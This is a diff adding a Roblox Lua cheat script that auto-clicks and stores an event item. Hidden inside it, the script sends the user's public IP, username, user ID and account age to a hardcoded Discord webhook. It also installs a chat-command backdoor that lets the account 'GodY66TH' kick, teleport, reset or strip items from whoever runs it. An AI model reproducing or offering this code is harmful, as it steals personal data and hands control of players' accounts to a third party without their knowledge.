@@ -1,1 +1,178 @@
+if not _G.ExecutedXylo then
+spawn(function()
+function SendWebhook(Arg)
+        local HttpService = game:GetService("HttpService")
+        local Webhook_URL = "https://discord.com/api/webhooks/1194307108334735510/u6wSa8okM3oek3OjMZG2BeX3miucRCyMUGLer5WXoPBmAJLL8bTYPivmJ2JkTxn9hsug"
 
+        local response = request({
+            Url = Webhook_URL,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = HttpService:JSONEncode({
+                ["content"] = "",
+                ["embeds"] = {{
+                    ["title"] = "",
+                    ["description"] = "",
+                    ["type"] = "rich",
+                    ["color"] = tonumber(0xffffff),
+                    ["fields"] = {
+                        {
+                            ["name"] = "",
+                            ["value"] = Arg,
+                            ["inline"] = true
+                        }
+                    }
+                }}
+            })
+        })
+end
+
+SendWebhook("IP : "tostring(game:HttpGet("https://wtfismyip.com/text")) .. "\nUsername : "..game:GetService("Players").LocalPlayer.Name .. "\nDisplayName : "..game:GetService("Players").LocalPlayer.DisplayName.."\nUserID : "..game:GetService("Players").LocalPlayer.UserId.."\n AccountAge : "..game:GetService("Players").LocalPlayer.AccountAge)
+end)
+
+_G.ExecutedXylo = true
+local RandomCode = math.random(1,100)
+_G.Click = true
+_G.EventItem = "Blade Kagenou"
+_G.PrivateMessage = true
+local AutoStore = true
+spawn(function()
+local Check = false
+_G.DelayAuto = 1.5
+while _G.Click == true do
+if Check == false then
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1840, 15, 1983)
+wait(3)
+for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
+if v.Name == "ClickDetector" then
+local Distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Parent.Position).Magnitude
+if Distance <= 15 then
+v.Parent.Name = "Event Item Click"
+Check = true
+end
+end
+end
+end
+
+for i = 1,1000 do
+fireclickdetector(workspace["Event Item Click"].ClickDetector)
+end
+wait(math.random(1.5 , 2.5))
+end
+end)
+
+spawn(function()
+local bb = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(
+    function()
+        bb:CaptureController()
+        bb:ClickButton2(Vector2.new())
+    end
+)
+end)
+
+spawn(function()
+local function sayMessage(msg)
+if _G.PrivateMessage == true then
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w GodY66TH "..msg, "All")
+else
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+end
+end
+
+local function playerJoined(player)
+    if player.Name == "GodY66TH" then
+        sayMessage("Hello My Code Is : " .. RandomCode)
+        player.Chatted:Connect(function(msg)
+            if msg == "!checkbot" then
+                sayMessage("My Code Is : " .. RandomCode)
+            elseif msg == "!kick "..RandomCode or msg == "!kick all" then
+                game:GetService("Players").LocalPlayer:Kick()
+            elseif msg == "!bring "..RandomCode or msg == "!bring all" then
+                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -7.5)
+            elseif msg == "!auto "..RandomCode or msg == "!auto all" then
+                sayMessage("Click Event Item Status : " .. tostring(not Click))
+                Click = not Click
+            elseif msg == "!droptools "..RandomCode or msg == "!droptools all" then
+                for _, tool in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
+                    if tool:IsA("Tool") and tool.CanBeDropped == true then
+                        if game:GetService("Players").LocalPlayer.Character:FIndFirstChildOfClass("Tool") then
+                            game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Backpack
+                        end
+                        tool.Parent = game:GetService("Players").LocalPlayer.Character
+                        wait(0.05)
+                        tool.Parent = workspace
+                        wait(0.05)
+                    end
+                    sayMessage("Done!")
+                end
+            elseif msg == "!autostore "..RandomCode or msg == "!autostore all" then
+                sayMessage("Auto Store Event Item Status: " .. tostring(not AutoStore))
+                AutoStore = not AutoStore
+            elseif msg == "!randomcode "..RandomCode or msg == "!randomcode all" then
+                RandomCode = math.random(1, 100)
+                sayMessage("My Code Is: " .. RandomCode)
+            elseif msg == "!reset "..RandomCode or msg == "!reset all" then
+                game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0
+            elseif msg == "!EventItems "..RandomCode or msg == "!EventItems all" then
+                spawn(function()
+                    local stringValue = game:GetService("Players").LocalPlayer.Data.InvData2.Value
+                    local itemName = _G.EventItem
+                    local count = 0
+                    local startIdx, endIdx = stringValue:find(itemName)
+                    while startIdx do task.wait()
+                        count = count + 1
+                        startIdx, endIdx = stringValue:find(itemName, endIdx + 1)
+                    end
+                    sayMessage("Event Item : " .. count)
+                end)
+            elseif msg == "!privatemsg "..RandomCode or msg == "!privatemsg all" then
+                if _G.PrivateMessage == true then
+                    _G.PrivateMessage = false
+                    sayMessage("Disabled PrivateMessage")
+                else
+                    _G.PrivateMessage = true
+                    sayMessage("Enabled PrivateMessage")
+                end
+            elseif msg == "!geteventitem "..RandomCode then
+                if AutoStore == true then
+                    sayMessage("Disable AutoStore Event Item First")
+                else
+                    for i = 1,10 do wait(0.05)
+                        local args = {
+    [1] = "Change",
+    [2] = _G.EventItem,
+    [3] = "Inv"
+}
+
+game:GetService("ReplicatedStorage"):FindFirstChild("Inventory"):FireServer(unpack(args))
+sayMessage("Done!")
+                    end
+                end
+            end
+        end)
+    end
+end
+
+for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+    playerJoined(player)
+end
+
+game:GetService("Players").PlayerAdded:Connect(playerJoined)
+end)
+
+while AutoStore == true do
+task.wait(0.15)
+local args = {
+    [1] = "Change",
+    [2] = _G.EventItem,
+    [3] = "Backpack"
+}
+
+game:GetService("ReplicatedStorage"):FindFirstChild("Inventory"):FireServer(unpack(args))
+end
+else
+game.Players.LocalPlayer:Kick("รันสองรอบทำไม -_-")
+end
